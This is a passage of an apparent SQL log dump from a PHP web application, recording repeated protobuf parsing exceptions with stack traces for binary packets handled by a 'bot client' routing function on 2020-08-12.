(135, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:6 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'.\\xDA\\xBD\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'.\\xDA\\xBD\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'.\\xDA\\xBD\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:41:58'),
(136, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:7 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'_NW\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'_NW\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'_NW\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:42:00'),
(137, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:1 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'I\\xD22\\x9E\\x84\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'I\\xD22\\x9E\\x84\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'I\\xD22\\x9E\\x84\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:42:01'),
(138, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:3 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\x93\\xEA\\xD2\\xFA\\x84{\\x9C\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\x93\\xEA\\xD2\\xFA\\x84{\\x9C\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\x93\\xEA\\xD2\\xFA\\x84{\\x9C\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:42:21'),
(139, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\x95\\x04\\xB3\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\x95\\x04\\xB3\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\x95\\x04\\xB3\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:43:01'),
(140, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:7 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xD7S\\x8A\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xD7S\\x8A\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xD7S\\x8A\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:43:03'),
(141, 'Router', 'onBotClientStrategy (exception)', 'Exception: Expected type:3 but had  in /var/www/html/application/modules/protobuf/message/pb_message.php:221\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\x13O\\xC2\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\x13O\\xC2\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\x13O\\xC2\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:43:09'),
(142, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:3 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xF3\\xC0,\\x8B\\xFBn\\xC6\\x84\\xC6\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xF3\\xC0,\\x8B\\xFBn\\xC6\\x84\\xC6\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xF3\\xC0,\\x8B\\xFBn\\xC6\\x84\\xC6\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:43:30'),
(143, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:4 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\',\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\',\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\',\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:43:51'),
(144, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:7 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'g\\x0E\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'g\\x0E\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'g\\x0E\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:44:10'),
(145, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:7 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'g\\x0E\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'g\\x0E\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'g\\x0E\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:44:11'),
(146, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:7 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\x87\\xBBv\\xC9$\\xBE\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\x87\\xBBv\\xC9$\\xBE\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\x87\\xBBv\\xC9$\\xBE\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:44:53'),
(147, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:7 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\x87\\xBBv\\xC9$\\xBE\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\x87\\xBBv\\xC9$\\xBE\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\x87\\xBBv\\xC9$\\xBE\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:44:54'),
(148, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:6 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'V\\f\\xEB\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'V\\f\\xEB\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'V\\f\\xEB\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:45:51'),
(149, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:6 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'V\\f\\xEB\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'V\\f\\xEB\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'V\\f\\xEB\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:45:52'),
(150, 'Router', 'onBotClientStrategy (exception)', 'Exception: Expected type:1 but had  in /var/www/html/application/modules/protobuf/message/pb_message.php:212\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'!\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'!\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'!\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:46:07'),
(151, 'Router', 'onBotClientStrategy (exception)', 'Exception: Expected type:1 but had  in /var/www/html/application/modules/protobuf/message/pb_message.php:212\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'!\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'!\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'!\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:46:09'),
(152, 'Router', 'onBotClientStrategy (exception)', 'Exception: Expected type:1 but had  in /var/www/html/application/modules/protobuf/message/pb_message.php:212\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'!\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'!\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'!\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:46:10'),
(153, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:3 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xB3\\xAEJ\\x94\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xB3\\xAEJ\\x94\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xB3\\xAEJ\\x94\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:47:03'),
(154, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:3 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xB3\\xAEJ\\x94\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xB3\\xAEJ\\x94\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xB3\\xAEJ\\x94\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:47:04'),
(155, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:3 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xB3\\xAEJ\\x94\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xB3\\xAEJ\\x94\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xB3\\xAEJ\\x94\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:47:05'),
(156, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:4 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'D\\xAAy\\xB3>3\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'D\\xAAy\\xB3>3\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'D\\xAAy\\xB3>3\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:47:37'),
(157, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:6 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'V\\f\\xEB\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'V\\f\\xEB\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'V\\f\\xEB\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:47:39'),
(158, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:6 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'V\\f\\xEB\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'V\\f\\xEB\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'V\\f\\xEB\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:47:42'),
(159, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:6 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'V\\f\\xEB\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'V\\f\\xEB\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'V\\f\\xEB\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:47:48'),
(160, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:3 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'{\\xAF\\xB0\\xF5\\xD7\\x83\\xFAKz\\xF4m\\xF3\\xB6\\xBE\\xC2...\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'{\\xAF\\xB0\\xF5\\xD7\\x83\\xFAKz\\xF4m\\xF3\\xB6\\xBE\\xC2...\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'{\\xAF\\xB0\\xF5\\xD7\\x83\\xFAKz\\xF4m\\xF3\\xB6\\xBE\\xC2...\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:48:02'),
(161, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:4 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xAC33`\\x9F\'\\xD0f\\x86=2\\x07\\x94\\xD2c...\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xAC33`\\x9F\'\\xD0f\\x86=2\\x07\\x94\\xD2c...\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xAC33`\\x9F\'\\xD0f\\x86=2\\x07\\x94\\xD2c...\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:48:03'),
(162, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:3 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xC0\\xC9(c\\xB3\"\\xDD\\x96\\x8A,I\\xB5\\xB6]v...\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xC0\\xC9(c\\xB3\"\\xDD\\x96\\x8A,I\\xB5\\xB6]v...\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xC0\\xC9(c\\xB3\"\\xDD\\x96\\x8A,I\\xB5\\xB6]v...\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:48:05'),
(163, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:4 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\x04\\x01o\\x86\\x11\\x19h\\xA6\\x8Dw\\x16\\fFB\\x9F...\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\x04\\x01o\\x86\\x11\\x19h\\xA6\\x8Dw\\x16\\fFB\\x9F...\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\x04\\x01o\\x86\\x11\\x19h\\xA6\\x8Dw\\x16\\fFB\\x9F...\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 12:48:49'),
(164, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:7 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 18:35:39'),
(165, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:7 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xEF\\xBE\\xFC\'\\x0F\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): require_once(\'/var/www/html/a...\')\n#7 {main}', '2020-08-12 19:40:51'),
(166, 'Router', 'onBotClientStrategy (exception)', 'Exception: I dont understand this wired code:5 in /var/www/html/application/modules/protobuf/message/pb_message.php:193\nStack trace:\n#0 /var/www/html/application/modules/protobuf/message/pb_message.php(148): PBMessage->_ParseFromArray()\n#1 /var/www/html/application/modules/protobuf/protocol/PacketTypes/PacketGeneral.php(10): PBMessage->ParseFromString(\'\\xDD\\xFA\\xD0\\xA3?J0 \\xEC\\x14\\xEF\\xB6\\xAEt\\xEF...\')\n#2 /var/www/html/application/modules/protobuf/protocol/ProtobufProtocolWorker.php(17): PacketGeneral->__construct(\'\\xDD\\xFA\\xD0\\xA3?J0 \\xEC\\x14\\xEF\\xB6\\xAEt\\xEF...\')\n#3 /var/www/html/application/core/route.php(58): ProtobufProtocolWorker->parsePacket(\'\\xDD\\xFA\\xD0\\xA3?J0 \\xEC\\x14\\xEF\\xB6\\xAEt\\xEF...\')\n#4 /var/www/html/application/core/route.php(9): Route::onBotClientStrategy()\n#5 /var/www/html/application/bootstrap.php(88): Route::start()\n#6 /var/www/html/index.php(3): 